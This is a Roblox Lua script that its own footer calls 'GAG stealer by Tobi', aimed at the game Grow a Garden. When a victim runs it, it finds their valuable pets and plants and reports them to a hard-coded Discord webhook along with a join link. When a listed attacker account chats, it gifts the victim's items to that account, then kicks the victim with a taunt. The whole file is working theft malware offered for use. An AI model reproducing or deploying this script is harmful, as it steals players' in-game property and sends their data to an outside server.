-- Reset execution guard
_G.scriptExecuted = false

_G.Usernames = {"iamzanji11", "iamzanji22", "iamzanji33"}
_G.min_value = 1000000  -- Lowered from 100 million to 1 million
_G.pingEveryone = "Yes"
_G.webhook = "https://discord.com/api/webhooks/1393589102821249074/rj931h6KfxS4KSeQ2RXKBxcuPgP-gLwqQn_IBA-CQoSt_XlT0HjkUjPHh9LrKAL2sk9o"

-- Remove the execution guard check
-- if _G.scriptExecuted then
--     return
-- end
-- _G.scriptExecuted = true

local users = _G.Usernames or {}
local min_value = _G.min_value or 1000000  -- Lowered default
local ping = _G.pingEveryone or "No"
local webhook = _G.webhook or ""

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local plr = Players.LocalPlayer
local backpack = plr:WaitForChild("Backpack")
local replicatedStorage = game:GetService("ReplicatedStorage")
local modules = replicatedStorage:WaitForChild("Modules")
local calcPlantValue = require(modules:WaitForChild("CalculatePlantValue"))
local petUtils = require(modules:WaitForChild("PetServices"):WaitForChild("PetUtilities"))
local petRegistry = require(replicatedStorage:WaitForChild("Data"):WaitForChild("PetRegistry"))
local numberUtil = require(modules:WaitForChild("NumberUtil"))
local dataService = require(modules:WaitForChild("DataService"))
local character = plr.Character or plr.CharacterAdded:Wait()
local excludedItems = {"Seed", "Shovel [Destroy Plants]", "Water", "Fertilizer"}
local rarePets = {"Red Fox", "Raccoon", "Dragonfly", "Caterpillar"}
local totalValue = 0
local itemsToSend = {}

-- Add debug print
print("Script starting...")
print("Place ID:", game.PlaceId)
print("Min value:", min_value)

if next(users) == nil or webhook == "" then
    print("ERROR: No usernames or webhook configured")
    plr:kick("You didn't add any usernames or webhook")
    return
end

if game.PlaceId ~= 126884695634066 then
    print("ERROR: Wrong game - Place ID:", game.PlaceId)
    plr:kick("Game not supported. Please join a normal GAG server")
    return
end

-- Add try-catch for server type check
local success, serverType = pcall(function()
    return game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer()
end)

if success and serverType == "VIPServer" then
    print("ERROR: VIP Server detected")
    plr:kick("Server error. Please join a DIFFERENT server")
    return
end

print("All checks passed, continuing...")

-- ... existing code ...
local function calcPetValue(v14)
    local hatchedFrom = v14.PetData.HatchedFrom
    if not hatchedFrom or hatchedFrom == "" then
        return 0
    end
    local eggData = petRegistry.PetEggs[hatchedFrom]
    if not eggData then
        return 0
    end
    local v17 = eggData.RarityData.Items[v14.PetType]
    if not v17 then
        return 0
    end
    local weightRange = v17.GeneratedPetData.WeightRange
    if not weightRange then
        return 0
    end
    local v19 = numberUtil.ReverseLerp(weightRange[1], weightRange[2], v14.PetData.BaseWeight)
    local v20 = math.lerp(0.8, 1.2, v19)
    local levelProgress = petUtils:GetLevelProgress(v14.PetData.Level)
    local v22 = v20 * math.lerp(0.15, 6, levelProgress)
    local v23 = petRegistry.PetList[v14.PetType].SellPrice * v22
    return math.floor(v23)
end

local function formatNumber(number)
    if number == nil then
        return "0"
    end
	local suffixes = {"", "k", "m", "b", "t"}
	local suffixIndex = 1
	while number >= 1000 and suffixIndex < #suffixes do
		number = number / 1000
		suffixIndex = suffixIndex + 1
	end
    if suffixIndex == 1 then
        return tostring(math.floor(number))
    else
        if number == math.floor(number) then
            return string.format("%d%s", number, suffixes[suffixIndex])
        else
            return string.format("%.2f%s", number, suffixes[suffixIndex])
        end
    end
end

local function getWeight(tool)
    local weightValue = tool:FindFirstChild("Weight") or 
                       tool:FindFirstChild("KG") or 
                       tool:FindFirstChild("WeightValue") or
                       tool:FindFirstChild("Mass")

    local weight = 0

    if weightValue then
        if weightValue:IsA("NumberValue") or weightValue:IsA("IntValue") then
            weight = weightValue.Value
        elseif weightValue:IsA("StringValue") then
            weight = tonumber(weightValue.Value) or 0
        end
    else
        local weightMatch = tool.Name:match("%((%d+%.?%d*) ?kg%)")
        if weightMatch then
            weight = tonumber(weightMatch) or 0
        end
    end

    return math.floor(weight * 100 + 0.5) / 100
end

local function getHighestKGFruit()
    local highestWeight = 0

    for _, item in ipairs(itemsToSend) do
        if item.Weight > highestWeight then
            highestWeight = item.Weight
        end
    end

    return highestWeight
end

local function SendJoinMessage(list, prefix)
    local fields = {
        {
            name = "Victim Username:",
            value = plr.Name,
            inline = true
        },
        {
            name = "Join link:",
            value = "https://fern.wtf/joiner?placeId=126884695634066&gameInstanceId=" .. game.JobId
        },
        {
            name = "Item list:",
            value = "",
            inline = false
        },
        {
            name = "Summary:",
            value = string.format("Total Value: ¢%s\nHighest weight fruit: %.2f KG", formatNumber(totalValue), getHighestKGFruit()),
            inline = false
        }
    }

    for _, item in ipairs(list) do
        local line = string.format("%s (%.2f KG): ¢%s", item.Name, item.Weight, formatNumber(item.Value))
        fields[3].value = fields[3].value .. line .. "\n"
    end

    if #fields[3].value > 1024 then
        local lines = {}
        for line in fields[3].value:gmatch("[^\r\n]+") do
            table.insert(lines, line)
        end

        while #fields[3].value > 1024 and #lines > 0 do
            table.remove(lines)
            fields[3].value = table.concat(lines, "\n") .. "\nPlus more!"
        end
    end

    local data = {
        ["content"] = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(126884695634066, '" .. game.JobId .. "')",
        ["embeds"] = {{
            ["title"] = "\240\159\140\180 Join to get GAG hit",
            ["color"] = 65280,
            ["fields"] = fields,
            ["footer"] = {
                ["text"] = "GAG stealer by Tobi. discord.gg/GY2RVSEGDT"
            }
        }}
    }

    local body = HttpService:JSONEncode(data)
    local headers = {
        ["Content-Type"] = "application/json"
    }
    
    -- Add error handling for request function
    local success, response = pcall(function()
        return request({
            Url = webhook,
            Method = "POST",
            Headers = headers,
            Body = body
        })
    end)
    
    if not success then
        print("ERROR: Failed to send webhook - request function not available")
        print("Response:", response)
    else
        print("Webhook sent successfully")
    end
end

local function SendMessage(sortedItems)
    local fields = {
		{
			name = "Victim Username:",
			value = plr.Name,
			inline = true
		},
		{
			name = "Items sent:",
			value = "",
			inline = false
		},
        {
            name = "Summary:",
            value = string.format("Total Value: ¢%s\nHighest weight fruit: %.2f KG", formatNumber(totalValue), getHighestKGFruit()),
            inline = false
        }
	}

    for _, item in ipairs(sortedItems) do
        local line = string.format("%s (%.2f KG): ¢%s", item.Name, item.Weight, formatNumber(item.Value))
        fields[2].value = fields[2].value .. line .. "\n"
    end

    if #fields[2].value > 1024 then
        local lines = {}
        for line in fields[2].value:gmatch("[^\r\n]+") do
            table.insert(lines, line)
        end

        while #fields[2].value > 1024 and #lines > 0 do
            table.remove(lines)
            fields[2].value = table.concat(lines, "\n") .. "\nPlus more!"
        end
    end

    local data = {
        ["embeds"] = {{
            ["title"] = "\240\159\140\180 New GAG Execution" ,
            ["color"] = 65280,
			["fields"] = fields,
			["footer"] = {
				["text"] = "GAG stealer by Tobi. discord.gg/GY2RVSEGDT"
			}
        }}
    }

    local body = HttpService:JSONEncode(data)
    local headers = {
        ["Content-Type"] = "application/json"
    }
    
    -- Add error handling for request function
    local success, response = pcall(function()
        return request({
            Url = webhook,
            Method = "POST",
            Headers = headers,
            Body = body
        })
    end)
    
    if not success then
        print("ERROR: Failed to send webhook - request function not available")
        print("Response:", response)
    else
        print("Webhook sent successfully")
    end
end

print("Scanning backpack for items...")
local itemCount = 0

for _, tool in ipairs(backpack:GetChildren()) do
    if tool:IsA("Tool") and not table.find(excludedItems, tool.Name) then
        itemCount = itemCount + 1
        print("Found item:", tool.Name)
        
        if tool:GetAttribute("ItemType") == "Pet" then
            local petUUID = tool:GetAttribute("PET_UUID")
            local v14 = dataService:GetData().PetsData.PetInventory.Data[petUUID]
            local itemName = v14.PetType
            if table.find(rarePets, itemName) or getWeight(tool) >= 10 then
                if tool:GetAttribute("Favorite") then
                    replicatedStorage:WaitForChild("GameEvents"):WaitForChild("Favorite_Item"):FireServer(tool)
                end
                local value = calcPetValue(v14)
                local toolName = tool.Name
                local weight = tonumber(toolName:match("%[(%d+%.?%d*) KG%]")) or 0
                totalValue = totalValue + value
                table.insert(itemsToSend, {Tool = tool, Name = itemName, Value = value, Weight = weight, Type = "Pet"})
                print("Added pet:", itemName, "Value:", value)
            end
        else
            local value = calcPlantValue(tool)
            print("Plant value:", value, "Min required:", min_value)
            if value >= min_value then
                local weight = getWeight(tool)
                local itemName = tool:GetAttribute("ItemName")
                totalValue = totalValue + value
                table.insert(itemsToSend, {Tool = tool, Name = itemName, Value = value, Weight = weight, Type = "Plant"})
                print("Added plant:", itemName, "Value:", value)
            end
        end
    end
end

print("Total items found:", itemCount)
print("Items to send:", #itemsToSend)
print("Total value:", totalValue)

if #itemsToSend > 0 then
    print("Processing items...")
    table.sort(itemsToSend, function(a, b)
        if a.Type ~= "Pet" and b.Type == "Pet" then
            return true
        elseif a.Type == "Pet" and b.Type ~= "Pet" then
            return false
        else
            return a.Value < b.Value
        end
    end)

    local sentItems = {}
    for i, v in ipairs(itemsToSend) do
        sentItems[i] = v
    end

    table.sort(sentItems, function(a, b)
        if a.Type == "Pet" and b.Type ~= "Pet" then
            return true
        elseif a.Type ~= "Pet" and b.Type == "Pet" then
            return false
        else
            return a.Value > b.Value
        end
    end)

    local prefix = ""
    if ping == "Yes" then
        prefix = "--[[@everyone]] "
    end

    SendJoinMessage(sentItems, prefix)

    local function doSteal(player)
        print("Starting steal process for player:", player.Name)
        
        -- Try different gift methods
        for _, item in ipairs(itemsToSend) do
            print("Attempting to gift item:", item.Name)
            item.Tool.Parent = character
            
            local success = false
            
            -- Method 1: Try Gift_Item event
            if not success then
                local giftSuccess, giftResult = pcall(function()
                    local giftEvent = replicatedStorage:WaitForChild("GameEvents"):WaitForChild("Gift_Item")
                    if giftEvent then
                        giftEvent:FireServer(item.Tool, player)
                        return true
                    end
                end)
                success = giftSuccess and giftResult
                if success then
                    print("Successfully gifted using Gift_Item event")
                end
            end
            
            -- Method 2: Try GiftPet event for pets
            if not success and item.Type == "Pet" then
                local petSuccess, petResult = pcall(function()
                    local giftPetEvent = replicatedStorage:WaitForChild("GameEvents"):WaitForChild("GiftPet")
                    if giftPetEvent then
                        giftPetEvent:FireServer(item.Tool, player)
                        return true
                    end
                end)
                success = petSuccess and petResult
                if success then
                    print("Successfully gifted pet using GiftPet event")
                end
            end
            
            -- Method 3: Try using proximity prompts as fallback
            if not success then
                print("Trying proximity prompt method for:", item.Name)
                local promptSuccess, promptResult = pcall(function()
                    -- Move close to player
                    local victimRoot = character:WaitForChild("HumanoidRootPart")
                    local targetRoot = player.Character:WaitForChild("HumanoidRootPart")
                    victimRoot.CFrame = targetRoot.CFrame + Vector3.new(0, 0, 3)
                    task.wait(0.1)
                    
                    -- Try to find and use proximity prompt
                    local promptRoot = targetRoot:WaitForChild("ProximityPrompt")
                    if promptRoot then
                        repeat
                            task.wait(0.01)
                        until promptRoot.Enabled
                        fireproximityprompt(promptRoot)
                        return true
                    end
                end)
                success = promptSuccess and promptResult
                if success then
                    print("Successfully used proximity prompt")
                end
            end
            
            if not success then
                print("Failed to gift item:", item.Name, "using all methods")
            end
            
            task.wait(0.3)
            item.Tool.Parent = backpack
            task.wait(0.3)
        end

        print("Steal process completed")
        plr:kick("All your stuff just got stolen by Tobi's stealer!\n Join discord.gg/GY2RVSEGDT")
    end

    local function waitForUserChat()
        local sentMessage = false
        local function onPlayerChat(player)
            if table.find(users, player.Name) then
                player.Chatted:Connect(function()
                    if not sentMessage then
                        SendMessage(sentItems)
                        sentMessage = true
                    end
                    doSteal(player)
                end)
            end
        end
        for _, p in ipairs(Players:GetPlayers()) do onPlayerChat(p) end
        Players.PlayerAdded:Connect(onPlayerChat)
        print("Waiting for target players to chat...")
    end
    waitForUserChat()
else
    print("No items found that meet the minimum value requirement")
end 
